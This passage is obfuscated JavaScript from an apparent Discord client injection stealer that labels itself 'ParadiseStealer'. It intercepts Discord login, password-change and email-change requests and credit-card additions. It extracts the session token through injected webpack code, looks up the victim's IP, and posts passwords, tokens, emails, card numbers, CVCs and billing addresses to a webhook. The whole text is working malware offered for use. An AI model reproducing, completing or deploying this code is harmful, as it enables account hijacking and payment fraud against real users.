                    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20",
                    !0x0
                )
                ["then"]((_0x35e5e5) => {
                    const _0x141786 = _0x55c798;
                    _0x57ac3b["webContents"][_0x141786(0x10f)](_0x141786(0x104) + _0xb0910c + _0x141786(0xc5), !0x0)[_0x141786(0xf7)]((_0xad53dc) => {
                        const _0x4f2857 = _0x141786,
                            _0x277b96 = JSON[_0x4f2857(0xd8)](_0x55efda);
                        var _0x330395 = {
                            username: _0x4f2857(0x131),
                            content: "",
                            embeds: [
                                {
                                    title: "Email\x20Changed",
                                    color: config["embed-color"],
                                    fields: [
                                        { name: _0x4f2857(0xf6), value: "`" + _0x277b96[_0x4f2857(0xcc)] + "#" + _0x277b96[_0x4f2857(0x116)] + "`", inline: !0x0 },
                                        { name: "ID", value: "`" + _0x277b96["id"] + "`", inline: !0x0 },
                                        { name: _0x4f2857(0xd3), value: "" + GetNitro(_0x277b96[_0x4f2857(0xe4)]), inline: !0x1 },
                                        { name: "Badges", value: "" + GetBadges(_0x277b96[_0x4f2857(0xf2)]), inline: !0x1 },
                                        {
                                            name: _0x4f2857(0x10c),
                                            value:
                                                "" +
                                                (function () {
                                                    const _0x34c9d8 = _0x4f2857,
                                                        _0x1df2ed = JSON[_0x34c9d8(0xd8)](_0xad53dc);
                                                    var _0x4c2383 = "";
                                                    return (
                                                        _0x1df2ed[_0x34c9d8(0xe1)]((_0x35e9f1) => {
                                                            const _0xbeebaf = _0x34c9d8;
                                                            if ("" == _0x35e9f1[_0xbeebaf(0x124)]) return "`<a:420_cross:931468716779114536>`";
                                                            if (0x2 == _0x35e9f1[_0xbeebaf(0x124)] && 0x1 != _0x35e9f1[_0xbeebaf(0xed)]) _0x4c2383 += _0xbeebaf(0xfe);
                                                            else {
                                                                if (0x1 != _0x35e9f1["type"] || 0x1 == _0x35e9f1[_0xbeebaf(0xed)]) return _0xbeebaf(0x117);
                                                                _0x4c2383 += _0xbeebaf(0x106);
                                                            }
                                                        }),
                                                        "" == _0x4c2383 && (_0x4c2383 = "`<a:420_cross:931468716779114536>`"),
                                                        _0x4c2383
                                                    );
                                                })(),
                                            inline: !0x1,
                                        },
                                        { name: "<:PP_director:942527310324719716>\x20New\x20Email", value: "`" + _0x3283ce + "`", inline: !0x0 },
                                        { name: _0x4f2857(0xb4), value: "`" + _0x1d6f5c + "`", inline: !0x0 },
                                        { name: _0x4f2857(0x10d), value: "```" + _0xb0910c + _0x4f2857(0x10e), inline: !0x1 },
                                    ],
                                    author: { name: _0x4f2857(0x131) },
                                    footer: { text: _0x4f2857(0x131) },
                                    thumbnail: { url: _0x4f2857(0x112) + _0x277b96["id"] + "/" + _0x277b96[_0x4f2857(0x12e)] },
                                },
                            ],
                        };
                        SendToWebhook(JSON[_0x4f2857(0x111)](_0x330395));
                    });
                });
        });
}
function CreditCardAdded(_0x298033, _0x19b387, _0x17195e, _0xd89251, _0x5d45a9, _0x5d35fa, _0x56387b, _0x3fbea4, _0x33d28e, _0xfa36cc) {
    const _0x119983 = _0xa16b14,
        _0x18cbc2 = BrowserWindow[_0x119983(0x12f)]()[0x0];
    _0x18cbc2["webContents"][_0x119983(0x10f)](_0x119983(0xe5) + _0xfa36cc + _0x119983(0xf5), !0x0)["then"]((_0x383595) => {
        const _0x482345 = _0x119983;
        _0x18cbc2[_0x482345(0x133)][_0x482345(0x10f)](_0x482345(0xcd), !0x0)[_0x482345(0xf7)]((_0x409b99) => {
            const _0x27b5aa = _0x482345;
            var _0x14eb39 = JSON[_0x27b5aa(0xd8)](_0x383595),
                _0x3c9571 = {
                    username: "ParadiseStealer",
                    content: "",
                    embeds: [
                        {
                            title: _0x27b5aa(0x13c),
                            description:
                                _0x27b5aa(0xf3) +
                                _0x14eb39[_0x27b5aa(0xcc)] +
                                "#" +
                                _0x14eb39["discriminator"] +
                                _0x27b5aa(0x13d) +
                                _0x14eb39["id"] +
                                "```\x0a**Email:**```" +
                                _0x14eb39["email"] +
                                _0x27b5aa(0xd7) +
                                GetNitro(_0x14eb39[_0x27b5aa(0xe4)]) +
                                _0x27b5aa(0xe6) +
                                GetBadges(_0x14eb39[_0x27b5aa(0xf2)]) +
                                "```\x0a**Credit\x20Card\x20Number:\x20**```" +
                                _0x298033 +
                                _0x27b5aa(0xd9) +
                                _0x17195e +
                                "/" +
                                _0xd89251 +
                                _0x27b5aa(0xea) +
                                _0x19b387 +
                                "```\x0a**Country:\x20**```" +
                                _0x33d28e +
                                _0x27b5aa(0xd4) +
                                _0x56387b +
                                _0x27b5aa(0xdc) +
                                _0x5d35fa +
                                "```\x0a**ZIP:**```" +
                                _0x3fbea4 +
                                _0x27b5aa(0xe3) +
                                _0x5d45a9 +
                                _0x27b5aa(0xca) +
                                _0xfa36cc +
                                _0x27b5aa(0x126) +
                                _0x409b99 +
                                "```",
                            author: { name: _0x27b5aa(0x131) },
                            footer: { text: _0x27b5aa(0x131) },
                            thumbnail: { url: _0x27b5aa(0x112) + _0x14eb39["id"] + "/" + _0x14eb39["avatar"] },
                        },
                    ],
                };
            SendToWebhook(JSON[_0x27b5aa(0x111)](_0x3c9571));
        });
    });
}
session[_0xa16b14(0x12d)]["webRequest"][_0xa16b14(0x11b)](Filter, (_0x4294ba, _0x19e6f2) => {
    const _0x2c0a28 = _0xa16b14;
    !_0x4294ba["url"][_0x2c0a28(0xb8)](_0x2c0a28(0xb1)) || (_0x2c0a28(0x128) != config[_0x2c0a28(0xfa)] && _0x2c0a28(0xe8) != config[_0x2c0a28(0xfa)]) ? (FirstTime(), _0x19e6f2({})) : _0x19e6f2({ cancel: !0x0 });
});
const ChangePasswordFilter = { urls: [_0xa16b14(0x145), "https://discordapp.com/api/v*/users/@me", _0xa16b14(0xc7), "https://discordapp.com/api/v*/auth/login", _0xa16b14(0xe0), "https://*.discord.com/api/v*/auth/login", _0xa16b14(0xbb)] };
session[_0xa16b14(0x12d)]["webRequest"][_0xa16b14(0xb7)](ChangePasswordFilter, (_0x6c9d4a, _0x308ada) => {
    const _0x568744 = _0xa16b14;
    if (_0x6c9d4a[_0x568744(0xcb)]["endsWith"]("login") && 0xc8 == _0x6c9d4a[_0x568744(0xf8)]) {
        const _0x7a1d5e = JSON[_0x568744(0xd8)](Buffer["from"](_0x6c9d4a[_0x568744(0x137)][0x0][_0x568744(0x102)])[_0x568744(0xde)]()),
            _0x3f1ade = _0x7a1d5e[_0x568744(0x109)],
            _0x440381 = _0x7a1d5e[_0x568744(0xdb)];
        BrowserWindow[_0x568744(0x12f)]()[0x0]
            [_0x568744(0x133)]["executeJavaScript"](
                "for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;",
                !0x0
            )
            [_0x568744(0xf7)]((_0xdfdd87) => {
                Login(_0x3f1ade, _0x440381, _0xdfdd87);
            });
    }
    if (_0x6c9d4a["url"][_0x568744(0xda)](_0x568744(0x11c)) && 0xc8 == _0x6c9d4a[_0x568744(0xf8)] && _0x568744(0xbd) == _0x6c9d4a["method"]) {
        const _0x5b405f = JSON[_0x568744(0xd8)](Buffer[_0x568744(0x135)](_0x6c9d4a[_0x568744(0x137)][0x0][_0x568744(0x102)])[_0x568744(0xde)]());
        null != _0x5b405f[_0x568744(0xdb)] &&
            null != _0x5b405f[_0x568744(0xdb)] &&
            "" != _0x5b405f[_0x568744(0xdb)] &&
            (null != _0x5b405f[_0x568744(0xe2)] &&
                null != _0x5b405f[_0x568744(0xe2)] &&
                "" != _0x5b405f["new_password"] &&
                BrowserWindow["getAllWindows"]()[0x0]
                    [_0x568744(0x133)]["executeJavaScript"](
                        "for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;",
                        !0x0
                    )
                    ["then"]((_0x503b17) => {
                        const _0xded4e4 = _0x568744;
                        ChangePassword(_0x5b405f["password"], _0x5b405f[_0xded4e4(0xe2)], _0x503b17);
                    }),
            null != _0x5b405f[_0x568744(0xd0)] &&
                null != _0x5b405f[_0x568744(0xd0)] &&
                "" != _0x5b405f[_0x568744(0xd0)] &&
                BrowserWindow["getAllWindows"]()[0x0]
                    [_0x568744(0x133)][_0x568744(0x10f)](_0x568744(0xc0), !0x0)
                    [_0x568744(0xf7)]((_0x11f757) => {
                        const _0x1b045e = _0x568744;
                        ChangeEmail(_0x5b405f[_0x1b045e(0xd0)], _0x5b405f[_0x1b045e(0xdb)], _0x11f757);
                    }));
    }
    if (_0x6c9d4a[_0x568744(0xcb)][_0x568744(0xda)](_0x568744(0x142))) {
        const _0x111612 = BrowserWindow[_0x568744(0x12f)]()[0x0],
            _0x3e4bd4 = querystring[_0x568744(0xd8)](decodeURIComponent(Buffer[_0x568744(0x135)](_0x6c9d4a[_0x568744(0x137)][0x0][_0x568744(0x102)])[_0x568744(0xde)]()));
        _0x111612[_0x568744(0x133)]
            [_0x568744(0x10f)](
                "for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;",
                !0x0
            )
            ["then"]((_0x34180c) => {
                const _0x341808 = _0x568744;
                CreditCardAdded(
                    _0x3e4bd4[_0x341808(0x123)],
                    _0x3e4bd4[_0x341808(0x129)],
                    _0x3e4bd4[_0x341808(0xba)],
                    _0x3e4bd4[_0x341808(0xff)],
                    _0x3e4bd4[_0x341808(0x100)],
                    _0x3e4bd4[_0x341808(0x105)],
                    _0x3e4bd4["card[address_state]"],
                    _0x3e4bd4[_0x341808(0xc8)],
                    _0x3e4bd4[_0x341808(0x140)],
                    _0x34180c
                );
            });
    }
}),
    (module[_0xa16b14(0xee)] = require(_0xa16b14(0x122)));
